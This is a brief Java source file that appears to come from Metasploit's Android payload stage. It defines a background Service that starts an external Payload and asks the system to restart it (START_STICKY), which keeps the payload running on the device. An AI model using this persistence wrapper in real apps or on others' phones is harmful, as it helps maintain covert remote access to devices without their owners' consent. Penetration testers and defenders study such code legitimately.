package com.metasploit.stage;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class MainService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Payload.start(this);
        return START_STICKY;
    }

}
